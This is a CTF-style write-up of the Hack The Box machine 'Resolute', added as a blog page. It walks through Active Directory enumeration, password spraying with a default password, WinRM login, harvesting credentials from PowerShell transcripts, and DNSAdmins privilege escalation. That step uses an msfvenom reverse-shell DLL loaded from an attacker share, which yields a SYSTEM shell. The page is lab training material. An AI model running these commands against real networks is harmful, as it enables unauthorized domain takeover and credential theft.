@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CentHack | Welcome to my blog!!</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CentHack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Welcome to my blog!!" />
+<meta property="og:description" content="Welcome to my blog!!" />
+<link rel="canonical" href="http://localhost:4000/pages/writeups/resolute.html" />
+<meta property="og:url" content="http://localhost:4000/pages/writeups/resolute.html" />
+<meta property="og:site_name" content="CentHack" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CentHack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Welcome to my blog!!","headline":"CentHack","url":"http://localhost:4000/pages/writeups/resolute.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CentHack</h1>
+        </a>
+        <h2>Welcome to my blog!!</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="resolute">Resolute</h1>
+
+<h1 id="skills">Skills</h1>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>A basic port scan showed that this is probably a active directory machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE          REASON
+88/tcp    open  kerberos-sec     syn-ack
+135/tcp   open  msrpc            syn-ack
+139/tcp   open  netbios-ssn      syn-ack
+389/tcp   open  ldap             syn-ack
+445/tcp   open  microsoft-ds     syn-ack
+464/tcp   open  kpasswd5         syn-ack
+593/tcp   open  http-rpc-epmap   syn-ack
+636/tcp   open  ldapssl          syn-ack
+3268/tcp  open  globalcatLDAP    syn-ack
+3269/tcp  open  globalcatLDAPssl syn-ack
+5985/tcp  open  wsman            syn-ack
+9389/tcp  open  adws             syn-ack
+47001/tcp open  winrm            syn-ack
+49664/tcp open  unknown          syn-ack
+49665/tcp open  unknown          syn-ack
+49666/tcp open  unknown          syn-ack
+49669/tcp open  unknown          syn-ack
+49670/tcp open  unknown          syn-ack
+49678/tcp open  unknown          syn-ack
+49679/tcp open  unknown          syn-ack
+49684/tcp open  unknown          syn-ack
+49707/tcp open  unknown          syn-ack
+</code></pre></div></div>
+
+<p>If that’s the case crackmapexec should gives us more insight about it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/resolute]
+└─<span class="nv">$ </span>crackmapexec smb 10.10.10.169                                            
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:RESOLUTE<span class="o">)</span> <span class="o">(</span>domain:megabank.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We don’t see any reference to a domain controller in the name, but we have a domain name: <code class="language-plaintext highlighter-rouge">megabank.local</code> . Now we are going to check every service to see what we can get.</p>
+
+<h2 id="smb">SMB</h2>
+
+<ul>
+  <li>Need credentials</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/resolute/enumeration]
+└─<span class="nv">$ </span>crackmapexec smb 10.10.10.169 <span class="nt">-u</span> <span class="s1">'%'</span> <span class="nt">-p</span><span class="s1">'%'</span> <span class="nt">--shares</span>
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:RESOLUTE<span class="o">)</span> <span class="o">(</span>domain:megabank.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\%</span>:% STATUS_LOGON_FAILURE 
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/resolute/enumeration]
+└─<span class="nv">$ </span>smbclient <span class="nt">-L</span> <span class="se">\\\\</span>10.10.10.169<span class="se">\\</span> 
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\k</span>ali]:
+Anonymous login successful
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
+do_connect: Connection to 10.10.10.169 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<h2 id="rpc">RPC</h2>
+
+<ul>
+  <li>We can enumerate the domain using RPC</li>
+</ul>
+
+<p>First we will enumerate the users.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/resolute/enumeration]
+└─<span class="nv">$ </span>rpcclient <span class="nt">-U</span> <span class="s1">'%'</span> 10.10.10.169                     
+rpcclient <span class="nv">$&gt;</span> enumdomusrs
+<span class="nb">command </span>not found: enumdomusrs
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[ryan] rid:[0x451]
+user:[marko] rid:[0x457]
+user:[sunita] rid:[0x19c9]
+user:[abigail] rid:[0x19ca]
+user:[marcus] rid:[0x19cb]
+user:[sally] rid:[0x19cc]
+user:[fred] rid:[0x19cd]
+user:[angela] rid:[0x19ce]
+user:[felicia] rid:[0x19cf]
+user:[gustavo] rid:[0x19d0]
+user:[ulf] rid:[0x19d1]
+user:[stevie] rid:[0x19d2]
+user:[claire] rid:[0x19d3]
+user:[paulo] rid:[0x19d4]
+user:[steve] rid:[0x19d5]
+user:[annette] rid:[0x19d6]
+user:[annika] rid:[0x19d7]
+user:[per] rid:[0x19d8]
+user:[claude] rid:[0x19d9]
+user:[melanie] rid:[0x2775]
+user:[zach] rid:[0x2776]
+user:[simon] rid:[0x2777]
+user:[naoki] rid:[0x2778]
+</code></pre></div></div>
+
+<h2 id="ldap">LDAP</h2>
+
+<ul>
+  <li>We can connect without a user to LDAP</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/resolute/enumeration]
+└─<span class="nv">$ </span>ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.10.10.169  <span class="nt">-b</span> <span class="s2">"dc=megabank,dc=local"</span>               
+<span class="c"># extended LDIF</span>
+<span class="c">#</span>
+<span class="c"># LDAPv3</span>
+<span class="c"># base &lt;dc=megabank,dc=local&gt; with scope subtree</span>
+<span class="c"># filter: (objectclass=*)</span>
+<span class="c"># requesting: ALL</span>
+<span class="c">#</span>
+
+<span class="c"># megabank.local</span>
+dn: <span class="nv">DC</span><span class="o">=</span>megabank,DC<span class="o">=</span><span class="nb">local
+</span>objectClass: top
+objectClass: domain
+objectClass: domainDNS
+distinguishedName: <span class="nv">DC</span><span class="o">=</span>megabank,DC<span class="o">=</span><span class="nb">local
+</span>instanceType: 5
+whenCreated: 20190925132822.0Z
+whenChanged: 20231106160222.0Z
+subRefs: <span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>megabank,DC<span class="o">=</span><span class="nb">local
+</span>subRefs: <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>megabank,DC<span class="o">=</span><span class="nb">local
+</span>subRefs: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>megabank,DC<span class="o">=</span><span class="nb">local
+</span>uSNCreated: 4099
+dSASignature:: <span class="nv">AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAI0kCuedEgkuD1X4NGZryvA</span><span class="o">==</span>
+uSNChanged: 151597
+name: megabank
+objectGUID:: RungtOfLt0KPoFxM7C/lqg<span class="o">==</span>
+replUpToDateVector:: AgAAAAAAAAAWAA
+</code></pre></div></div>
+
+<p>With all this we can try various attacks.</p>
+
+<ul>
+  <li>ASP-ROAST attack</li>
+  <li>ldapdomaindump (whole domain enumeration) → won’t work</li>
+  <li>rpcenum https://github.com/s4vitar/rpcenum.git (partially enumerate the domain)</li>
+</ul>
+
+<p>If we use rpcenum to dump all general information about users in the domain, we will see that one user has his password in his description.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+                 +                                                           +
+  | User            | Description                                               |                                                                                                                                                           
+  +                 +                                                           +                                                                                                                                                           
+  | Administrator   | Built-in account <span class="k">for </span>administering the computer/domain    |                                                                                                                                                           
+  | Guest           | Built-in account <span class="k">for </span>guest access to the computer/domain  |                                                                                                                                                           
+  | krbtgt          | Key Distribution Center Service Account                   |                                                                                                                                                           
+  | DefaultAccount  | A user account managed by the system.                     |                                                                                                                                                           
+  | marko           | Account created. Password <span class="nb">set </span>to Welcome123!              |                                                                                                                                                           
+  +                 +                                                           +
+</code></pre></div></div>
+
+<p>But it seems like the password is not correct.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/resolute/rpcenum]
+└─<span class="nv">$ </span>crackmapexec smb 10.10.10.169 <span class="nt">-u</span> <span class="s1">'marko'</span> <span class="nt">-p</span> <span class="s1">'Welcome123!'</span> <span class="nt">--shares</span>
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:RESOLUTE<span class="o">)</span> <span class="o">(</span>domain:megabank.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\m</span>arko:Welcome123! STATUS_LOGON_FAILURE
+</code></pre></div></div>
+
+<p>Maybe this is the default password when an account is created and another users hasn’t changed it. So let’s create a dictionary with all the domain users and try this.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/resolute]
+└─<span class="nv">$ </span>crackmapexec smb 10.10.10.169 <span class="nt">-u</span> users.txt  <span class="nt">-p</span> <span class="s1">'Welcome123!'</span> <span class="nt">--continue-on-success</span>
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:RESOLUTE<span class="o">)</span> <span class="o">(</span>domain:megabank.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\A</span>dministrator:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\G</span>uest:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\k</span>rbtgt:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\D</span>efaultAccount:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\r</span>yan:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\m</span>arko:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\s</span>unita:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\a</span>bigail:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\m</span>arcus:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\s</span>ally:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\f</span>red:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\a</span>ngela:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\f</span>elicia:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\g</span>ustavo:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\u</span>lf:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\s</span>tevie:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\c</span>laire:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\p</span>aulo:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\s</span>teve:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\a</span>nnette:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\a</span>nnika:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\p</span>er:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\c</span>laude:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>+] megabank.local<span class="se">\m</span>elanie:Welcome123! 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\z</span>ach:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\s</span>imon:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] megabank.local<span class="se">\n</span>aoki:Welcome123! STATUS_LOGON_FAILURE
+</code></pre></div></div>
+
+<p>We have credentials <code class="language-plaintext highlighter-rouge">melanie:Welcome123!</code> .</p>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>Actually, melanie is part of the Remote Management Users, so we can connect to the machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/resolute]
+└─<span class="nv">$ </span>crackmapexec winrm 10.10.10.169 <span class="nt">-u</span> <span class="s1">'melanie'</span>  <span class="nt">-p</span> <span class="s1">'Welcome123!'</span>     
+SMB         10.10.10.169    5985   RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 <span class="o">(</span>name:RESOLUTE<span class="o">)</span> <span class="o">(</span>domain:megabank.local<span class="o">)</span>
+HTTP        10.10.10.169    5985   RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.169:5985/wsman
+WINRM       10.10.10.169    5985   RESOLUTE         <span class="o">[</span>+] megabank.local<span class="se">\m</span>elanie:Welcome123! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We can connect using evil-winrm</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/resolute]
+└─<span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 10.10.10.169 <span class="nt">-u</span> <span class="s1">'melanie'</span> <span class="nt">-p</span> <span class="s1">'Welcome123!'</span>   
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<p>In the \Users\ folder we see the user ryan, let’s see in what groups is this user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers&gt; <span class="nb">dir
+
+    </span>Directory: C:<span class="se">\U</span>sers
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----        9/25/2019  10:43 AM                Administrator
+d-----        12/4/2019   2:46 AM                melanie
+d-r---       11/20/2016   6:39 PM                Public
+d-----        9/27/2019   7:05 AM                ryan
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers&gt; net user ryan
+User name                    ryan
+Full Name                    Ryan Bertrand
+Comment
+User<span class="s1">'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            11/6/2023 8:32:02 AM
+Password expires             Never
+Password changeable          11/7/2023 8:32:02 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *Contractors
+The command completed successfully.
+</span></code></pre></div></div>
+
+<p>He is the group <strong>Contractors</strong> which is not a common group in active directory. After executing PoweUp.ps1 and winPEAS I have nothing, so let’s do a manual enumeration. Since there is not much to do on the box, let’s try to find files where the name <strong>ryan</strong> is mentioned.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>findstr /SI <span class="s2">"passw pwd ryan"</span> <span class="k">*</span>.xml <span class="k">*</span>.ini <span class="k">*</span>.txt <span class="k">*</span>.ps1 <span class="k">*</span>.bat <span class="k">*</span>.config
+</code></pre></div></div>
+
+<p>Luckly, we get the password of this user in the output.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PSTranscripts<span class="se">\2</span>0191203<span class="se">\P</span>owerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:+ cmd /c net use X: <span class="se">\\</span>fs01<span class="se">\b</span>ackups ryan Serv3r4Admin4cc123!
+PSTranscripts<span class="se">\2</span>0191203<span class="se">\P</span>owerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:+ cmd /c net use X: <span class="se">\\</span>fs01<span class="se">\b</span>ackups ryan Serv3r4Admin4cc123!
+</code></pre></div></div>
+
+<p>So now we have the credentials <code class="language-plaintext highlighter-rouge">ryan:Serv3r4Admin4cc123!</code> , which actually are valid.</p>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<p>From the previuos enumeration we could see that there is not much to do in the box, so the path to Administrator from Ryan must come from a new privilege that this user has.</p>
+
+<p>If we use bloodhound to enumerate the domain, we will see that the user ryan is part of the <strong>DNSAdmin</strong> group, which means that we may have a possibility to escalate privilege.</p>
+
+<ul>
+  <li>First we create a DLL with a reverse shell as payload</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-a</span> x64 <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;ATTACKER_IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> dll <span class="o">&gt;</span> exploit.dll
+</code></pre></div></div>
+
+<ul>
+  <li>Inject it into the dns.exe process.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnscmd RESOLUTE /config /serverlevelplugindll <span class="se">\\</span>10.10.14.12<span class="se">\s</span>hare<span class="se">\w</span>eb.dll
+</code></pre></div></div>
+
+<ul>
+  <li>Stop and start the service</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmd /c sc.exe stop dns
+cmd /c sc.exe start dns
+</code></pre></div></div>
+
+<p>I had to repeat the injection and the restart various times until I got a shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/resolute]
+└─<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.169] 56380
+Microsoft Windows <span class="o">[</span>Version 10.0.14393]                                                                                                                                                                                                      
+<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. All rights reserved.                                                                                                                                                                                        
+                                                                                                                                                                                                                                            
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami                                                                                                                                                                                                                  
+<span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+</code></pre></div></div>
+
+      </section>
+    </div>
+  </body>
+</html>
